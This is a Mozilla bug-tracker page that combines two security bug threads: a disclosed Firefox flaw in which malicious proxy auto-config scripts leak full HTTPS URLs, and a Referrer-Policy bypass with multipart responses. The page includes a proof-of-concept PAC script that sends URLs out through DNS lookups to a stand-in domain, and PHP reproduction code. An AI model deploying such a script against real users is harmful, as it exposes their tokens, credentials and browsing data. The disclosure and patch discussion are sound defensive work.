Core :: Networking
For bugs in Mozilla's modular networking library (aka "Netlib" or "Necko".) The networking library supplies the software interface that Mozilla uses to access physical transports (e.g. the Internet and local drives), perform URL resolutions, and handle a variety of networking protocols.

Examples of appropriate bugs: URLs with backslash not fetched; URLs starting with a single slash turn into http:///; Cannot access authenticated FTP site.

Description: Proxy Auto-Config SSL/TLS Url Disclosure
Versions Affected: All
Category: Information Disclosure
Reporter: Alex Chapman and Paul Stone of Context Information Security
Summary:
--------
Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox. The PAC file specifies a Javascript function, FindProxyForURL(url, host), which is called for each URL request in order to determine the required proxy for the connection. This function receives the full URL and hostname for both HTTP and HTTPS requests, which can be leaked by a malicious PAC script. This could expose credentials, tokens, search terms or any other data passed in HTTPS URL query strings to internet based attackers that would otherwise be encrypted. This issue does not affect the default configuration of Firefox.
Analysis:
---------
The PAC file is executed in a limited, sandboxed Javascript environment, but some functions are still available (see <http://findproxyforurl.com/pac-functions/>), most notably dnsResolve. This allows for the full request URL from affected clients to be leaked to an attacker's DNS server or local network hosts via LLMNR.
Since PAC files must be specified manually (either in Firefox or in the system proxy settings), this issue would require a network-based attacker to be able to intercept network traffic of a client configured with a PAC file. For example, this could be performed by a malicious gateway.
All software that implements the PAC specification as written is affected by this issue. We have has confirmed this issue in a number of browsers and operating systems. Notably however, Internet Explorer does not leak full URLs, instead passing only the protocol and hostname to the 'url' parameter of FindProxyForURL (e.g. <https://www.example.com/>, not <https://www.example.com/index.html?foo=bar>). Therefore a possible fix for this issues is to follow this same behaviour.
Proof of Concept:
-----------------
A PAC script can be crafted, as below, which will perform a DNS lookup based on the host and url parameters passed into the function:
function FindProxyForURL(url, host){{
if (dnsResolve((url+'.example.com').replace(/[^a-z0-9\_-]+/gi,'.')))
return "DIRECT";
return "DIRECT";
}}
This will perform DNS lookups with the encoded URLs against the example.com DNS server.
See the following example DNS captures from HTTPS requests:

the pac file is a script - we support fetching it either via file or https which is what you need to do to trust the transport of any script. It generally boils down to that.
the difference in the url parameter vs ie is interesting, but I would still be concerned about compat in making that change. I've seen pac files in bug reports that inspect the full path.
blocking dnsResolve isn't much an answer either. it has compat issues of course, but you can encode the same information in the proxy name returned and used by the script if you like.Flags: needinfo?(mcmanus)

Over in the equivalent Chrome bug, there's some discussion about using the full URL or truncated URL depending on how a PAC file has been delivered (i.e. local file vs. WPAD vs. HTTPS). They've added some telemetry to Chrome Canary to gather some stats on actual PAC usage. The URL for that bug is <https://bugs.chromium.org/p/chromium/issues/detail?id=593759> if anyone has access to it. The issue is worse in Chrome, since Windows users are vulnerable by default.
We've submitted a talk to Black Hat USA that features the PAC vulnerability. Fortunately Firefox users aren't vulnerable to this by default, but it would be good to get this fixed by then if possible.

Apple have now fixed this in OS X 10.11.5 / iOS 9.3.2 ([CVE-2016-1801](https://www.cve.org/CVERecord?id=CVE-2016-1801)). Chrome has a patch ready to land. For Chrome they decided to simply strip the path and query string for all HTTPS URLs sent to PAC scritps by default, with a flag to revert to the old behaviour.

My thinking is to just cut off the path from the URI that gets passed to the javascript as shown here. It is basically what Chrome does.
Should we offer a prefs to switch back the old behavior for the edge cases where someone actually needs this? I suppose that is the safe approach and Chrome has such a toggle.

I've verified in manual tests that the previous patch cuts off the paths in ordinary web navigations when using a PAC proxy.
If that approach is doable, then we could make it conditional on a pref like this patch (this is a follow-up separate patch meant to be applied after the one I already posted). The pref is named "network.proxy.autoconfig\_url.include\_path" so if anyone reading this feels strongly about pref naming, here's your chance =)

I think this fix is fine. but:
1] there's certainly a chance it breaks test coverage. You're going to have to run it through try and given the balance of what's at risk here I think that's ok. just merge it into another known good wip patchset of yours to avoid flagging it.
2] it needs a test which I think can be done without actually proxying any real transactions.

Chrome has merged their fix into the version 52 branch which will be released to stable near the end of July.

My patch caused problems on try: <https://treeherder.mozilla.org/#/jobs?repo=try&revision=90e6ef68fe95f05fde6ad71aa1f93476597f2664&selectedJob=21938341>
The test case in question that fails there doesn't work on my local machine even without this patch so I'm struggling a bit to understand what's going on.

v2-0001-bug-1244474-cut-off-path-from-URLs-passed-to-PAC-.patch
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
While the patch shows the problem clearly, getting a rouge PAC file into a victim's browser is not easily done but requires a particular situation. Although for someone in that position, reading this patch will make it clear how the flaw can be exploited.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
No.
Which older supported branches are affected by this flaw?
All branches since the dawn of time.
If not all supported branches, which bug introduced the flaw?
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
I would assume they will be identical or at least very similar (pref changes tend to need to be given a touch).
How likely is this patch to cause regressions; how much testing does it need?
It is likely to cause some regressions somewhere due to the nature: it cuts off information that is given to javascript functions, although the pref is there to allow users to switch it on in case they really need to.
The patch itself gets tested just by using proxy set with PAC which is not terribly uncommon. It is also tested by the test suite.

I'm not too familiar with the build/release process but <http://hg.mozilla.org/mozilla-central/rev/df6b25262c65> says that the patch was backed out.

Attached patch

[v3-0001-Bug-1255474-cut-off-path-from-URLs-passed-to-PAC-.patch](attachment.cgi?id=8792768&action=diff)
— [Details](attachment.cgi?id=8792768&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1255474&attachment=8792768)

Okay, here's an updated version of this patch. It took me a while to figure out why it caused so much breakage and in the end it was almost too obvious: the previous version of the patch cut off \*the entire path\* which left PAC scripts that check for the path part by scanning for a slash to fail. And in our own test suite, we have a lot of such PAC scripts apparently!
This updated version makes sure to leave the first path byte, the slash, in the trimmed URL that is passed to the PAC script. (If it detects a path at all)
Due to me also rearranging things slightly, I figured I'd ask for a refreshed review too before landing. It is still a very small and simple patch. The try run for this incarnation can be seen here: <https://treeherder.mozilla.org/#/jobs?repo=try&revision=853e2c1ce6cfec1fe2d9b7c092a32610028244f4&selectedJob=27661859>

I just updated to 51.0.1 on Windows. I've set network.proxy.autoconfig\_url.include\_path to true. Even after restarting, FindProxyForUrl is still only being passed the truncated URL.
(this change broke no-ads (schooner.com/~loverso/no-ads/), which wouldn't be a problem if the new parameter was working)

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_11\_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7
Steps to reproduce:
Following two URLs return a HTML document with "Referrer-Policy no-referrer" in a response header.
#1. MIME: text/html
<http://mallory.csrf.jp/x-mixed-replace/referrer/index.html>
#2. MIME: multipart/x-mixed-replace
<http://mallory.csrf.jp/x-mixed-replace/referrer/bad.php>
The hyperlink in #1 sends no REFERER header but the hyperlink in #2 sends REFERER.
Actual results:
This means that a HTML document sent with multipart/x-mixed-replace ignores Referrer-Policy response header. This can be a cause of sensitive information leakage.
Expected results:
Referrer-Policy header should be applied to documents with multipart/x-mixed-replace.

This seems to be a bug in parsing the referrer-policy header, not the referrer-policy handling in general. Adding a |referrerpolicy="no-referrer"| attribute to the link makes the referrer policy work correctly.
Thomas, can you have a look what's going on here?Flags: needinfo?(tnguyen)

Just a quick look, referrer-policy is ignored when the channel is multipart-channel [1]
Add the following code to query multipart channel works
if (!httpChannel) {
nsCOMPtr<nsIMultiPartChannel> multipart = do\_QueryInterface(aChannel);
if (multipart) {
nsCOMPtr<nsIChannel> baseChannel;
multipart->GetBaseChannel(getter\_AddRefs(baseChannel));
httpChannel = do\_QueryInterface(baseChannel);
}
}
We could easily fix and add referrer-policy parsing in multipart-channel, but I am not very sure others header in [2]. Seems that all that headers are ignored in multipart-channel.

FWIW, X-Frame-Options header is in the list but it works well (not ignored).

(In reply to Muneaki Nishimura from [comment #8](/show_bug.cgi?id=1295945#c8 "VERIFIED FIXED - HTML documents sent with multipart/x-mixed-replace ignores Referrer-Policy response header"))
I could successfully reproduce it.
There are 2 ways to set response headers in multipart/mixed-\* data.
One is to set it in HTTP header (1) and another one is to specify in each fragment part of HTTP response body (2).
Firefox ignores Referer-Policy header in (1)(2) but ignores X-Frame-Options in (2).
Following PHP code can reproduce it.
<?php
header("Content-Type: multipart/x-mixed-replace;boundary=boundary");
header("X-FRAME-OPTIONS: DENY"); // (1) Not ignored
header("Referrer-Policy no-referrer"); // (1) Ignored
echo("--boundary\r\n");
echo("Content-type: text/html\r\n");
echo("X-FRAME-OPTIONS: DENY\r\n"); // (2) Ignored
echo("Referrer-Policy no-referrer\r\n"); // (2) Ignored
echo("\r\n");
echo("<a href=/referer\_stealer.php>Link</a>\r\n");
echo("--boundary\r\n");
?>

[PHP code for testing the issue](attachment.cgi?id=8782802)
— [Details](attachment.cgi?id=8782802&action=edit)

I uploaded the test PHP code as attached.
Steps to reproduce is below:
1. Deploy 3 files in your local server and open "index.html" with Firefox.
2. If a page (content.php) is shown in an iframe X-Frame-Options header is ignored.
3. Click a link in "content.php" and then Firefox navigates to "check.php".
4. If REFERER header is shown Referrer-Policy header is ignored.Flags: needinfo?(sdna.muneaki.nishimura)

referrer.patch
I don't understand the patch. In nsDocument::RetrieveRelevantHeaders First we try to get the http channel using GetHttpChannelHelper. That deals with multipart channels too. But if that fails, we explicitly QI to nsIMultiPartChannel and try to get http channel again.Flags: needinfo?(bugs)

referrer.patch
Does it make sense to copy refresh and content-disposition from http channel? Maybe it does.
multipart/x-mixed-replace should be quite rarely used these days.

This is a security issue for sites relying on this header, not something that can attack Firefox itself. A malicious site can't use this, but a non-malicious site could accidentally leak information it was trying to keep hidden. Because multipart/x-mixed-replace is extremely uncommon this doesn't seem exceptional enough to rate a bug bounty.Flags: sec-bounty? → sec-bounty-

This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
